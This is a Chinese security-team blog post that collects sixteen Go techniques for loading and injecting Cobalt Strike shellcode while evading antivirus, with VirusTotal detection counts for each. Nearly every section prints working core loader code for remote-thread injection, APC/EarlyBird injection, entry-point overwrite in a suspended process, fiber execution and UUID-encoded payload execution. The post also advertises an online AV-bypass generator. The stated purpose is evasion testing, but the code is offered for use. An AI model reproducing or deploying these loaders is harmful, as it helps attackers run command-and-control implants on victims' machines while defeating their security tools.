<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/c4LkV7PdzaXYH7H1Ix6mcA)

免杀专题文章及工具：https://github.com/TideSec/BypassAntiVirus

免杀专题在线文库：http://wiki.tidesec.com/docs/bypassav

本文涉及的所有代码和资料：https://github.com/TideSec/GoBypassAV/

0x01 基于 API 的免杀测试
=================

1.1 介绍
------

目前基于 Go 的免杀，很大一部分都是基于已有 API 来各种姿势的加载 shellcode，再加上 shellcode 的加解密、代码混淆、加壳、条件执行等方法，从而规避杀软的检测。

基于 Go 的各种加载器也就是为 shellcode 申请一段内存，然后把指令寄存器指向 shellcode 的开头，让机器执行这段 shellcode，而 Go 实现这个功能就需要调用 windows API 了。

**本次所有测试代码：`https://github.com/TideSec/GoBypassAV/`下的`Go_Windows_API`目录，所有代码均可单独编译运行。**

通过对 Go 免杀的研究，实现了一个在线免杀平台，目前生成 x64 位的免杀效果尚可，x86 的效果一般。

**潮影在线免杀平台：http://bypass.tidesec.com/**

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealQzC19Q6OBSWMxCfuP32mJG7cmpQ1GVRxfR9OYdGBCvYib5CVMTvPA0g/640?wx_fmt=png)

1.2 测试环境
--------

**本文搜集汇总了网上各种基于 Go 的 API 代码实现方式，共 16 种，应该算是比较全面的了，逐一进行了免杀测试。**

*   测试环境：Win10 x64
    
*   shellcode：CobalStrike 4.4 生成的 64 位 shellcode，使用了异或 xor 算法进行编码
    
*   Golang 版本：1.18.3
    
*   测试参数：使用`go build -gcflags=-trimpath=$GOPATH -asmflags=-trimpath=$GOPATH -ldflags "-w -s"` 编译生成
    
*   说明：方便对比起见，本次测试均未结合其他免杀方式。
    

CobalStrike 4.4 生成的 shellcode 使用异或算法进行编码，异或代码在这里：`https://github.com/TideSec/GoBypassAV/blob/master/Encryption/xor/xor.go`

1.3 测试结果
--------

测试使用的平台为 VT 平台：`https://virustotal.com/`

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealDTy2iaicvLV8DI3FZlPRY8Fp5c6MkGmeiaXzqSxhWAbicsia06E80NLhWeg/640?wx_fmt=png)

API 介绍部分参考`piiperxyz`大佬的`https://github.com/piiperxyz/AniYa`。

0x02 不同 API 的免杀测试情况
===================

2.00 HelloTide 测试 (VT 免杀率 7/70)
-------------------------------

测试之前先用`helloTide`测试一下，发现 VT 的查杀率能到 7/70，所以现在想把 Go 语言做到 0 免杀已经很难了，能达到 10/70 以下就算不错的了。在去年的时候还能用`-race`参数做到基本 0 免杀，但现在加上`-race`参数只会查杀更厉害。

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealvPP8blQFmspNpqicCEuUKwkezZ3LOauKcA0Ju8QN4RwKAJKmqvpSNPw/640?wx_fmt=png)

```
package mainimport "fmt"func main(){ fmt.Println("Hello Tide")}
```

2.01 CreateFiber(VT 免杀率 18/70)
------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealKoaQNxSJd9Ss569F7kZU0vciaz2qypRicGAicSj42FwHVWhv9FicjefQ6Q/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")ntdll := windows.NewLazySystemDLL("ntdll.dll")VirtualAlloc := kernel32.NewProc("VirtualAlloc")VirtualProtect := kernel32.NewProc("VirtualProtect")RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")CreateFiber := kernel32.NewProc("CreateFiber")SwitchToFiber := kernel32.NewProc("SwitchToFiber")fiberAddr, _, _ := ConvertThreadToFiber.Call()addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))oldProtect := PageReadwrite_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))fiber, _, _ := CreateFiber.Call(0, addr, 0)_, _, _ = SwitchToFiber.Call(fiber)_, _, _ = SwitchToFiber.Call(fiberAddr)
```

2.02 CreateProcessWithPipe(VT 免杀率 8/70)
---------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealfzBN1BXuYdBJj8xe8A7eEARKpe34UYjeB6FIMZ2fqmr12Go7Elo9kA/640?wx_fmt=png)

核心代码

```
VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(*program), syscall.StringToUTF16Ptr(*args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
```

2.03 CreateRemoteThread(VT 免杀率 8/70)
------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5Cslteal6tOrqqB576BCO2qO14uR1usb7gBTjQkogSQySwsC6JeGy8MMKcCQmA/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")pHandle, _ := windows.OpenProcess(    windows.PROCESS_CREATE_THREAD|        windows.PROCESS_VM_OPERATION|        windows.PROCESS_VM_WRITE|        windows.PROCESS_VM_READ|        windows.PROCESS_QUERY_INFORMATION,    false,    uint32(pid),)addr, _, _ := VirtualAllocEx.Call(    uintptr(pHandle),    0,    uintptr(len(shellcode)),    windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,)fmt.Println("ok")_, _, _ = WriteProcessMemory.Call(    uintptr(pHandle),    addr,    (uintptr)(unsafe.Pointer(&shellcode[0])),    uintptr(len(shellcode)),)oldProtect := windows.PAGE_READWRITE_, _, _ = VirtualProtectEx.Call(    uintptr(pHandle),    addr,    uintptr(len(shellcode)),    windows.PAGE_EXECUTE_READ,    uintptr(unsafe.Pointer(&oldProtect)),)_, _, _ = CreateRemoteThreadEx.Call(uintptr(pHandle), 0, 0, addr, 0, 0, 0)_ = windows.CloseHandle(pHandle
```

2.04 CreateRemoteThreadEx(VT 免杀率 9/70)
--------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealaDnfyzxpNSWVCKbrAA6icibb7wmdQJx15ITZ45NFvhia7z0wV1ywFh4FQ/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")OpenProcess := kernel32.NewProc("OpenProcess")VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")CloseHandle := kernel32.NewProc("CloseHandle")pHandle, _, _ := OpenProcess.Call(    windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|        windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0,    uintptr(uint32(pid)),)addr, _, _ := VirtualAllocEx.Call(pHandle, 0, uintptr(len(shellcode)),    windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)fmt.Println("ok")_, _, _ = WriteProcessMemory.Call(pHandle, addr, (uintptr)(unsafe.Pointer(&shellcode[0])),    uintptr(len(shellcode)))oldProtect := windows.PAGE_READWRITE_, _, _ = VirtualProtectEx.Call(pHandle, addr, uintptr(len(shellcode)),    windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))_, _, _ = CreateRemoteThreadEx.Call(pHandle, 0, 0, addr, 0, 0, 0)_, _, _ = CloseHandle.Call(uintptr(uint32(pHandle)))
```

2.05 CreateThread(VT 免杀率 8/70)
------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealsxZHvzWTJsfSYIZDQ4LT8iciaKoExRib7oYMneTGnJXV1QICdPXWP62icQ/640?wx_fmt=png)

核心代码

```
addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)),windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)ntdll := windows.NewLazySystemDLL("ntdll.dll")RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))var oldProtect uint32_ = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)kernel32 := windows.NewLazySystemDLL("kernel32.dll")CreateThread := kernel32.NewProc("CreateThread")thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)_, _ = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
```

2.06 CreateThreadNative(VT 免杀率 8/69)
------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealUQNB9ia9cicIByLF8oXq5WKAV5eYiaFB22wr6Rl9vZ5IB2fl7kPF60Efg/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")ntdll := windows.NewLazySystemDLL("ntdll.dll")VirtualAlloc := kernel32.NewProc("VirtualAlloc")VirtualProtect := kernel32.NewProc("VirtualProtect")RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")CreateThread := kernel32.NewProc("CreateThread")WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)),    MemCommit|MemReserve, PageReadwrite)_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])),    uintptr(len(shellcode)))oldProtect := PageReadwrite_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead,    uintptr(unsafe.Pointer(&oldProtect)))thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
```

2.07 CreatProcess(VT 免杀率 8/70)
------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealIYXnMTR6QW0lHjEBxC9nUgysWhRaExwS74wKI3dvENCrOIDQp5G6SQ/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")ntdll := windows.NewLazySystemDLL("ntdll.dll")VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")NtQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")procInfo := &windows.ProcessInformation{}startupInfo := &windows.StartupInfo{    Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,    ShowWindow: 1,}appName, _ := syscall.UTF16PtrFromString(program)commandLine, _ := syscall.UTF16PtrFromString("")_ = windows.CreateProcess(    appName,    commandLine,    nil,    nil,    true,    windows.CREATE_SUSPENDED,    nil,    nil,    startupInfo,    procInfo,)addr, _, _ := VirtualAllocEx.Call(    uintptr(procInfo.Process),    0,    uintptr(len(shellcode)),    windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE,)fmt.Println("ok")_, _, _ = WriteProcessMemory.Call(    uintptr(procInfo.Process),    addr,    (uintptr)(unsafe.Pointer(&shellcode[0])),    uintptr(len(shellcode)),)oldProtect := windows.PAGE_READWRITE_, _, _ = VirtualProtectEx.Call(    uintptr(procInfo.Process),    addr,    uintptr(len(shellcode)),    windows.PAGE_EXECUTE_READ,    uintptr(unsafe.Pointer(&oldProtect)),)var processInformation ProcessBasicInformationvar returnLength uintptr_, _, _ = NtQueryInformationProcess.Call(    uintptr(procInfo.Process),    0,    uintptr(unsafe.Pointer(&processInformation)),    unsafe.Sizeof(processInformation),    returnLength,)ReadProcessMemory := kernel32.NewProc("ReadProcessMemory")var peb PEBvar readBytes int32_, _, _ = ReadProcessMemory.Call(    uintptr(procInfo.Process),    processInformation.PebBaseAddress,    uintptr(unsafe.Pointer(&peb)),    unsafe.Sizeof(peb),    uintptr(unsafe.Pointer(&readBytes)),)var dosHeader ImageDosHeadervar readBytes2 int32_, _, _ = ReadProcessMemory.Call(    uintptr(procInfo.Process),    peb.ImageBaseAddress,    uintptr(unsafe.Pointer(&dosHeader)),    unsafe.Sizeof(dosHeader),    uintptr(unsafe.Pointer(&readBytes2)),)var Signature uint32var readBytes3 int32_, _, _ = ReadProcessMemory.Call(    uintptr(procInfo.Process),    peb.ImageBaseAddress+uintptr(dosHeader.LfaNew),    uintptr(unsafe.Pointer(&Signature)),    unsafe.Sizeof(Signature),    uintptr(unsafe.Pointer(&readBytes3)),)var peHeader ImageFileHeadervar readBytes4 int32_, _, _ = ReadProcessMemory.Call(    uintptr(procInfo.Process),    peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature),    uintptr(unsafe.Pointer(&peHeader)),    unsafe.Sizeof(peHeader),    uintptr(unsafe.Pointer(&readBytes4)),)var optHeader64 ImageOptionalHeader64var optHeader32 ImageOptionalHeader32var readBytes5 int32if peHeader.Machine == 34404 {    _, _, _ = ReadProcessMemory.Call(        uintptr(procInfo.Process),        peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader),        uintptr(unsafe.Pointer(&optHeader64)),        unsafe.Sizeof(optHeader64),        uintptr(unsafe.Pointer(&readBytes5)),    )} else if peHeader.Machine == 332 {    _, _, _ = ReadProcessMemory.Call(        uintptr(procInfo.Process),        peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader),        uintptr(unsafe.Pointer(&optHeader32)),        unsafe.Sizeof(optHeader32),        uintptr(unsafe.Pointer(&readBytes5)),    )}var ep uintptrif peHeader.Machine == 34404 {    ep = peb.ImageBaseAddress + uintptr(optHeader64.AddressOfEntryPoint)} else if peHeader.Machine == 332 {    ep = peb.ImageBaseAddress + uintptr(optHeader32.AddressOfEntryPoint)}var epBuffer []bytevar shellcodeAddressBuffer []byteif peHeader.Machine == 34404 {    epBuffer = append(epBuffer, byte(0x48))    epBuffer = append(epBuffer, byte(0xb8))    shellcodeAddressBuffer = make([]byte, 8)    binary.LittleEndian.PutUint64(shellcodeAddressBuffer, uint64(addr))    epBuffer = append(epBuffer, shellcodeAddressBuffer...)} else if peHeader.Machine == 332 {    epBuffer = append(epBuffer, byte(0xb8))    shellcodeAddressBuffer = make([]byte, 4) // 4 bytes for 32-bit address    binary.LittleEndian.PutUint32(shellcodeAddressBuffer, uint32(addr))    epBuffer = append(epBuffer, shellcodeAddressBuffer...)}epBuffer = append(epBuffer, byte(0xff))epBuffer = append(epBuffer, byte(0xe0))_, _, _ = WriteProcessMemory.Call(    uintptr(procInfo.Process),    ep,    uintptr(unsafe.Pointer(&epBuffer[0])),    uintptr(len(epBuffer)),)_, _ = windows.ResumeThread(procInfo.Thread)_ = windows.CloseHandle(procInfo.Process)_ = windows.CloseHandle(procInfo.Thread)
```

2.08 EarlyBird(VT 免杀率 6/69)
---------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealelaS5QgBybKnVO6RT9rdKkRDjuyywribXK7iaz28Ric4Xlc6whOKfliaZA/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")QueueUserAPC := kernel32.NewProc("QueueUserAPC")procInfo := &windows.ProcessInformation{}startupInfo := &windows.StartupInfo{Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,ShowWindow: 1,}program, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\notepad.exe")args, _ := syscall.UTF16PtrFromString("")_ = windows.CreateProcess(program,args,nil, nil, true,windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)),windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)fmt.Println("ok")_, _, _ = WriteProcessMemory.Call(uintptr(procInfo.Process), addr,(uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))oldProtect := windows.PAGE_READWRITE_, _, _ = VirtualProtectEx.Call(uintptr(procInfo.Process), addr,uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))_, _, _ = QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)_, _ = windows.ResumeThread(procInfo.Thread)_ = windows.CloseHandle(procInfo.Process)_ = windows.CloseHandle(procInfo.Thread)
```

2.09 EtwpCreateEtwThread(VT 免杀率 9/70)
-------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5Cslteal9E4gL208K9xicJnnhrexwOnAHathUTQDwog725QUn0CXOEI7uIC9e0g/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")ntdll := windows.NewLazySystemDLL("ntdll.dll")VirtualAlloc := kernel32.NewProc("VirtualAlloc")VirtualProtect := kernel32.NewProc("VirtualProtect")RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")EtwpCreateEtwThread := ntdll.NewProc("EtwpCreateEtwThread")WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)),    MemCommit|MemReserve, PageReadwrite)_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])),    uintptr(len(shellcode)))oldProtect := PageReadwrite_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)),    PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))thread, _, _ := EtwpCreateEtwThread.Call(addr, uintptr(0))_, _, _ = WaitForSingleObject.Call(thread, 0xFFFFFFFF)
```

2.10 HeapAlloc(VT 免杀率 18/70)
----------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealEkcsXUcRJZyrYFSndEMSbOicXFBeZicoEgibrEoPrY4uhqC9ibtoUS1ENA/640?wx_fmt=png)

核心代码

```
shellSize := uintptr(len(shellcode))handle, _, _ := RtlCreateHeap.Call(0x00040000|0x00000002, 0, shellSize, shellSize, 0, 0)alloc, _, _ := RtlAllocateHeap.Call(handle, 0x00000008, shellSize)for index := uint32(0); index < uint32(len(shellcode)); index++ {    writePtr := unsafe.Pointer(alloc + uintptr(index))    v := (*byte)(writePtr)    *v = shellcode[index]}_, _, _ = syscall.Syscall(alloc, 0, 0, 0, 0)
```

2.11 NtQueueApcThreadEx(VT 免杀率 9/70)
------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealPgPRaoicDnJR4sG6eLBOtY5JZQx0u1XTLKfK9zdBovexrLKClsic9QpA/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")ntdll := windows.NewLazySystemDLL("ntdll.dll")VirtualAlloc := kernel32.NewProc("VirtualAlloc")VirtualProtect := kernel32.NewProc("VirtualProtect")GetCurrentThread := kernel32.NewProc("GetCurrentThread")RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")NtQueueApcThreadEx := ntdll.NewProc("NtQueueApcThreadEx")addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)fmt.Println("ok")_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))oldProtect := PageReadwrite_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))thread, _, _ := GetCurrentThread.Call()_, _, _ = NtQueueApcThreadEx.Call(thread, 1, addr, 0, 0, 0)
```

2.12 ProcCryptProtectMemory(VT 免杀率 18/70)
-----------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealWWnVN7fE6xaAZZ5PQAFX00E7kzDjrW6os5Yr5p3VJwBXIicbqM1iafOw/640?wx_fmt=png)

核心代码

```
addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)if err != nil && err.Error() != "The operation completed successfully." {    syscall.Exit(0)}time.Sleep(2 * time.Second)_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))procCryptProtectMemory.Call(uintptr(addr), uintptr(len(charcode)), uintptr(0x00))if err != nil && err.Error() != "The operation completed successfully." {    syscall.Exit(0)}time.Sleep(2 * time.Second)syscall.Syscall(addr, 0, 0, 0, 0)
```

2.13 RtlCreateUserThread(VT 免杀率 8/69)
-------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealehuLDOCQdVv08oQcyIzpcWmBRKSpH5IVENedMJYSP1FicRog6YkdiaYQ/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32.dll")ntdll := windows.NewLazySystemDLL("ntdll.dll")OpenProcess := kernel32.NewProc("OpenProcess")VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")CloseHandle := kernel32.NewProc("CloseHandle")pHandle, _, _ := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|    windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,    0, uintptr(uint32(pid)))addr, _, _ := VirtualAllocEx.Call(pHandle, 0, uintptr(len(shellcode)),    windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)fmt.Println("ok")_, _, _ = WriteProcessMemory.Call(pHandle, addr, (uintptr)(unsafe.Pointer(&shellcode[0])),    uintptr(len(shellcode)))oldProtect := windows.PAGE_READWRITE_, _, _ = VirtualProtectEx.Call(pHandle, addr, uintptr(len(shellcode)),    windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))var tHandle uintptr_, _, _ = RtlCreateUserThread.Call(pHandle, 0, 0, 0, 0, 0, addr, 0,    uintptr(unsafe.Pointer(&tHandle)), 0)_, _, _ = CloseHandle.Call(uintptr(uint32(pHandle)))
```

2.14 RtlMoveMemory(VT 免杀率 17/70)
--------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5Csltealqu9XSlUNeyaJxn4iatPIqIic3sEmRnw2UXWbZjobHLbqI0JAzchoETpg/640?wx_fmt=png)

核心代码

```
addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)if addr == 0 {    checkErr(err)}_, _, err = RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))checkErr(err)for j := 0; j < len(shellcode); j++ {    shellcode[j] = 0}for j := 0; j < len(shellcode); j++ {    shellcode[j] = 0}syscall.Syscall(addr, 0, 0, 0, 0)
```

2.15 SyscallUnsafe(VT 免杀率 16/70)
--------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealWWnVN7fE6xaAZZ5PQAFX00E7kzDjrW6os5Yr5p3VJwBXIicbqM1iafOw/640?wx_fmt=png)

核心代码

```
func run(scd []byte) { ff := func() {} var oldfperms uint32 if !VirtualProtect1(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&ff))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) { } **(**uintptr)(unsafe.Pointer(&ff)) = *(*uintptr)(unsafe.Pointer(&scd)) var old uint32 if !VirtualProtect1(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&scd))), uintptr(len(scd)), uint32(0x40), unsafe.Pointer(&old)) { } ff()}
```

2.16 UuidFromString(VT 免杀率 19/70)
---------------------------------

![](https://mmbiz.qpic.cn/mmbiz_png/rTicZ9Hibb6RVjLuSIsgmsCcJD5CsltealJ6cKG2EtVzlibVBmlM0NmT4woAgTrJibSI536mme8ltJiaTjpz6ZHJkpQ/640?wx_fmt=png)

核心代码

```
kernel32 := windows.NewLazySystemDLL("kernel32")rpcrt4 := windows.NewLazySystemDLL("Rpcrt4.dll")heapCreate := kernel32.NewProc("HeapCreate")heapAlloc := kernel32.NewProc("HeapAlloc")enumSystemLocalesA := kernel32.NewProc("EnumSystemLocalesA")uuidFromString := rpcrt4.NewProc("UuidFromStringA")heapAddr, _, _ := heapCreate.Call(0x00040000, 0, 0)addr, _, _ := heapAlloc.Call(heapAddr, 0, 0x00100000)addrPtr := addrfor _, temp := range uuids {    u := append([]byte(temp), 0)    _, _, _ = uuidFromString.Call(uintptr(unsafe.Pointer(&u[0])), addrPtr)    addrPtr += 16}_, _, _ = enumSystemLocalesA.Call(addr, 0)
```

0x03 测试小结
=========

发现在使用 GO 进行免杀时，单纯使用 API 时有的效果还可以，但兼容性稳定性不一定好，而兼容性好使用较多的免杀效果又比较一般。

比如比较早期出现的 Go 加载器`https://github.com/brimstone/go-shellcode`就是用了上面`2.15 SyscallUnsafe`的方式，现在很多基于 Go 的免杀也都在使用这种 API，目前 VT 免杀率 16/70。

所以要想得到更好的免杀效果，还是要多种方式结合，下篇文章将总结一下 Golang 免杀的常见方式。多种方式结合，将会有更好的免杀效果。

0x04 参考资料
=========

本文内容参考节选自以下资料：

go-shellcode：`https://github.com/Ne0nd0g/go-shellcode`

GolangBypassAV：`https://github.com/safe6Sec/GolangBypassAV`

windows 免杀：`https://blog.z3ratu1.cn/windows免杀入门.htm`

AniYa 免杀：`https://github.com/piiperxyz/AniYa`

golang 免杀初尝试：`https://xz.aliyun.com/t/11279`

E

N

D

**关**

**于**

**我**

**们**

Tide 安全团队正式成立于 2019 年 1 月，是新潮信息旗下以互联网攻防技术研究为目标的安全团队，团队致力于分享高质量原创文章、开源安全工具、交流安全技术，研究方向覆盖网络攻防、系统安全、Web 安全、移动终端、安全开发、物联网 / 工控安全 / AI 安全等多个领域。

团队作为 “省级等保关键技术实验室” 先后与哈工大、齐鲁银行、聊城大学、交通学院等多个高校名企建立联合技术实验室，近三年来在网络安全技术方面开展研发项目 60 余项，获得各类自主知识产权 30 余项，省市级科技项目立项 20 余项，研究成果应用于产品核心技术研究、国家重点科技项目攻关、专业安全服务等。对安全感兴趣的小伙伴可以加入或关注我们。

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/rTicZ9Hibb6RUGxmZ0l89buUNbyVALKxic2nM7hnDCkAKIrjKhdcDfVkGq3PxNzgs7m55BBMwmicc0AvFpYcrd6J6Q/640?wx_fmt=jpeg)